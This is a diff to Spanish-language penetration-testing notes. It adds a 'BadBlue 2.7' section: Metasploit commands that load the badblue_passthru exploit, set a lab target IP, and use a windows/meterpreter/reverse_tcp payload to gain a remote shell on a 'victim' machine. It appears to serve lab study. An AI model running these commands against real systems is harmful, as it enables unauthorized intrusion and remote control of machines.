@@ -276,6 +276,21 @@ Staged                  # Sends payload in stages. Can be less stable -> **windo
 	❯ run 
 ```
 
+## BadBlue 2.7 'Exploit'
+
+```bash 
+	# Usaremos el BufferOverFlow para entrar a la maquina victima con 'Meterpreter'
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ search badblue 2.7                                    
+	❯ use exploit/windows/http/badblue_passthru             # Usamos el exploit 
+	❯ info
+	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set LHOST ens33                                       # Colocamos el puerto de nuestra maquina de atacante
+	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el payload a usar 
+	❯ options
+	❯ run
+```
 
 ## Puerto 3306 MYSQL 'Reconocimiento'
 
@@ -400,3 +415,4 @@ Staged                  # Sends payload in stages. Can be less stable -> **windo
 	❯ set cmd whoami                                        # Colocamos el comando a ejecutar 
 	❯ run
 ```
+
